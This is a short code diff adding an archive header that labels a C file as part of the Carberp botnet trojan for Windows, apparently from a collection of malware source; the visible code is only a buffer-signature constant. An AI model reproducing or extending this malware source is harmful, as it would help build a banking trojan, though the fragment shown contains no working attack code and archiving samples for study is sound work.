@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 // ---- Linked buffer ------------------------------------------------------------------------------------------------------------
 
 #define		LBUFFER_SIGN_LENGTH		16	// bytes
